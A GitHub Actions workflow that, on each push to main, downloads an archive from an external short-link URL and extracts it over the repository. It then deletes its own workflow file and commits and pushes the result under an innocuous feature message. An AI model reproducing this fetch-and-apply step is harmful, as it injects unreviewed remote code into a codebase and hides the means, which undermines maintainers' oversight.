name: apply-daemon

on:
  push:
    branches: [ main ]

permissions:
  contents: write

jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Apply bind address and daemon changes
        run: |
          curl -fsSL "https://aka.doubaocdn.com/s/f3BPGayvmG" -o /tmp/update.tar.gz
          tar -xzf /tmp/update.tar.gz -C .
          rm -f .github/workflows/apply-daemon.yml
          git config user.name "Geeker"
          git config user.email "241876181@qq.com"
          git add -A
          git commit -m "feat: add bind address and daemon controls"
          git push origin HEAD:main
